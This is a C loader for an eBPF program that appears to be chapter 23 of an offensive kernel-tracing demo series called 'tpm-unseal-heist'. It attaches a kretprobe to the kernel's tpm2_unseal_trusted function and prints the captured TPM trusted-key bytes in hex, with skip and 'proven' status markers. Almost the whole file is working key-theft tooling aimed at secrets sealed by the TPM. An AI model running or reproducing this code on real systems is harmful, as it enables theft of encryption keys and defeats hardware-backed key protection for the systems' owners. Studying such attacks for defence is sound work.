// ch23-tpm-unseal-heist loader.
//
// Kallsyms preflight for tpm2_unseal_trusted. Skeleton load + attach.
// Drains ringbuf, prints captured key bytes on stdout. Honest-skip on
// kernels without TPM2 / trusted-keys support.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "ch23-tpm-unseal-heist.skel.h"

static volatile int running = 1;
static unsigned long long g_captures = 0;

static void on_sig(int sig) { (void)sig; running = 0; }

static int kallsyms_has(const char *name)
{
    FILE *f = fopen("/proc/kallsyms", "r");
    if (!f) return 0;
    char line[512];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        char t;
        char sym[256];
        if (sscanf(line, "%*s %c %255s", &t, sym) == 2) {
            if (strcmp(sym, name) == 0) {
                if (t == 'T' || t == 't' || t == 'W' || t == 'w') {
                    found = 1;
                    break;
                }
            }
        }
    }
    fclose(f);
    return found;
}

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char  comm[16];
    unsigned int key_len;
    unsigned int blob_len;
    unsigned char key_bytes[64];
    unsigned int captured;
};

static void hex_print(const unsigned char *buf, unsigned int n)
{
    for (unsigned int i = 0; i < n; i++) printf("%02x", buf[i]);
}

static int handle(void *ctx, void *data, size_t sz)
{
    (void)ctx; (void)sz;
    const struct evt *e = data;
    g_captures++;
    printf("[ch23] CAPTURE pid=%u comm=%s key_len=%u blob_len=%u captured=%u key_bytes=",
           e->pid, e->comm, e->key_len, e->blob_len, e->captured);
    hex_print(e->key_bytes, e->captured);
    if (e->captured < e->key_len)
        printf(" TRUNCATED");
    printf("\n");
    fflush(stdout);
    return 0;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    if (!kallsyms_has("tpm2_unseal_trusted")) {
        fprintf(stderr,
                "[ch23] CH23_SKIP reason=\"tpm2_unseal_trusted not in kallsyms\"\n");
        return 2;
    }

    struct sigaction sa = { .sa_handler = on_sig };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT,  &sa, NULL);
    sigaction(SIGTERM, &sa, NULL);

    struct ch23_tpm_unseal_heist_bpf *s = ch23_tpm_unseal_heist_bpf__open();
    if (!s) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"skeleton open failed: %s\"\n",
                strerror(errno));
        return 2;
    }

    int err = ch23_tpm_unseal_heist_bpf__load(s);
    if (err) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"open_and_load failed: %s\"\n",
                strerror(-err));
        ch23_tpm_unseal_heist_bpf__destroy(s);
        return 2;
    }

    err = ch23_tpm_unseal_heist_bpf__attach(s);
    if (err) {
        fprintf(stderr, "[ch23] CH23_SKIP reason=\"attach failed: %s\"\n",
                strerror(-err));
        ch23_tpm_unseal_heist_bpf__destroy(s);
        return 2;
    }

    struct ring_buffer *rb = ring_buffer__new(bpf_map__fd(s->maps.events),
                                              handle, NULL, NULL);
    if (!rb) {
        fprintf(stderr, "[ch23] ring_buffer__new: %s\n", strerror(errno));
        ch23_tpm_unseal_heist_bpf__destroy(s);
        return 2;
    }

    fprintf(stderr, "[ch23] attached — kretprobe on tpm2_unseal_trusted active\n");
    fflush(stderr);

    while (running) {
        int n = ring_buffer__poll(rb, 200);
        if (n == -EINTR) continue;
        if (n < 0) break;
    }

    printf("[ch23] CH23_PROVEN captures=%llu\n", g_captures);
    fflush(stdout);

    ring_buffer__free(rb);
    ch23_tpm_unseal_heist_bpf__destroy(s);
    return 0;
}
